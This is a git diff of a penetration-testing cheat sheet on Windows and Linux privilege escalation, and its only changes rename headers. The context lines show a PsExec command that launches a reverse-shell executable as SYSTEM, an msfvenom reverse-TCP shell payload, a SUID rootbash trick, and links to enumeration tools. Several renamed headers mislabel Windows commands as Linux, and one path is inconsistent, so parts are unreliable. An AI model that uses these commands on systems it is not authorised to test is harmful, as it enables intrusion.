@@ -731,7 +731,7 @@ Static binaries
     - ```.\PsExec64.exe -accepteula -i -s C:\temp\reverse.exe```
     - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
 
-## Tools
+## Tools windows
 #### Powerup & SharpUp
 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 - https://github.com/GhostPack/SharpUp
@@ -765,7 +765,7 @@ reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 #### accesschk.exe
 AccessChk is an old but still trustworthy tool for checking user access control rights. You can use it to check whether a user or group has access to files, directories, services, and registry keys. The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.
 
-## Manual Enumeration 
+## Manual Enumeration linux
 #### Check the current user
 ```
 whoami
@@ -876,7 +876,7 @@ driverquery /v
 cd C:\Program Files\<DRIVER>
 ```
 
-## Privilege escalation techniques
+## Privilege escalation techniques linux
 Run winPEAS and if it find something fuzzy use these techniques to exploit it.
 
 ## Kernel exploits
@@ -1341,7 +1341,7 @@ cp /bin/bash /tmp/rootbash sh; chmod +s /temp/rootbash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
 ```
 
-## Tools
+## Tools linux
 #### Ise.sh (favorite from tib3rius)
 https://github.com/diego-treitos/linux-smart-enumeration
 
@@ -1359,7 +1359,7 @@ https://github.com/rebootuser/LinEnum
 ./linEnum.sh -k password -e export -t
 ```
 
-## Manual checks
+## Manual checks linux
 #### Check the current user
 ```
 whoami; id
@@ -1449,7 +1449,7 @@ sudo -u root <PATH TO PROGRAM> #manier1
 ./.suid_bash -p #manier2
 ```
 
-## Privilege escalation techniques
+## Privilege escalation techniques linux
 ### Kernel exploits
 Kernels are the core of any operating system. Think of it as a layer between application software and the actual computer hardware. The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the root user. Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.
 
